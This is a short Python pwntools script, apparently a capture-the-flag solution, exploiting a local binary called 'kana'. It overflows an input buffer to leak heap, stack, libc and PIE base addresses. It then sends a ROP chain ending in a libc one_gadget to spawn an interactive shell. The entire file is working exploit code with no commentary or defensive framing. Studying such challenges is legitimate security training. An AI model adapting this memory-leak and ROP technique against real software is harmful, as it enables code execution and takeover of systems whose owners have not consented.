from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./kana')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p = process('./kana')
pause()

p.sendlineafter(b'>> ', b'4')
p.sendlineafter(b'>> ', b'b' * 0x20)

payload = b'a' * 0x5c + b'\xaf' + b'c' * 0x10
p.sendlineafter(b'>> ', payload)
p.recvuntil(b' : ')
heap_addr = u64(p.recv(16)[8:16])
target_heap_addr = heap_addr - 0x23e8
print('leaked heap address:', hex(heap_addr))
print('target heap address:', hex(target_heap_addr))

payload = b'a' * 0x5c + b'\xaf' + b'c' * 0x10 + p64(target_heap_addr) + p64(0x20)
p.sendlineafter(b'>> ', payload)
p.recvuntil(b' : ')
stack_addr = u64(p.recv(8)[:8])
print('stack address:', hex(stack_addr))

payload = b'a' * 0x5c + b'\xaf' + b'c' * 0x10 + p64(stack_addr + 0xb0) + p64(0x20)
p.sendlineafter(b'>> ', payload)
p.recvuntil(b' : ')
libc.address = u64(p.recv(8)[:8]) - 0x29d90
print('libc base address:', hex(libc.address))

payload = b'a' * 0x5c + b'\xaf' + b'c' * 0x10 + p64(stack_addr - 0x20) + p64(0x20)
p.sendlineafter(b'>> ', payload)
p.recvuntil(b' : ')
pie_base = u64(p.recv(8)[:8]) - 0x6c68
print('PIE base address:', hex(pie_base))

pop_rsi_rbp = pie_base + 0x605f
pop_rdx = pie_base + 0x6022
one_gadget = libc.address + 0xebcf8 # rbp-0x78 is writable; rsi == NULL; rdx == NULL
payload = flat(
    b'a' * 0x6b,
    stack_addr,
    pop_rsi_rbp,
    0,
    stack_addr,
    pop_rdx,
    0,
    one_gadget,
)
p.sendlineafter(b'>> ', payload)

p.interactive()